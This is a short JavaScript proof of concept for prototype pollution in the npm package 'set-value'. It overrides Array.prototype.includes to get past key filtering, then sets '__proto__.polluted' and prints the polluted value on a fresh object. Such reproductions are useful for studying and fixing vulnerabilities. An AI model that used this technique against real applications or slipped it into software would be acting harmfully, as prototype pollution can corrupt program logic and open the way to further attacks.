Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const setFn = require('set-value');
const paths = ['__proto__.polluted'];
var obj = {};
console.log({}.polluted);
setFn({}, paths[0], 'yes');
console.log({}.polluted);